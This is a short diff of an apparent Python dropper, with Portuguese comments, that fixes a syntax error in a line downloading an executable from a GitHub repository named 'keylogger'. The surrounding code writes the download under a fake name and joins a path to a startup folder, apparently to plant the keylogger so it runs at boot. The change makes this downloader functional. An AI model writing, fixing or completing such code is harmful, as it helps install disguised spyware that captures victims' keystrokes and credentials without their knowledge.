@@ -26,7 +26,7 @@ inicializar = os.path.join(startup, FAKE_NAME)
 # Função de criar Canal
 criar_canal()
 
-resposta = requests.get('https://github.com/xinaiderf/keylogger/blob/main/dist/main.exe'
+resposta = requests.get('https://github.com/xinaiderf/keylogger/blob/main/dist/main.exe')
 if resposta.status_code == 200:
     with open(FAKE_NAME, 'wb' ) as f:
         f.write(resposta.content)
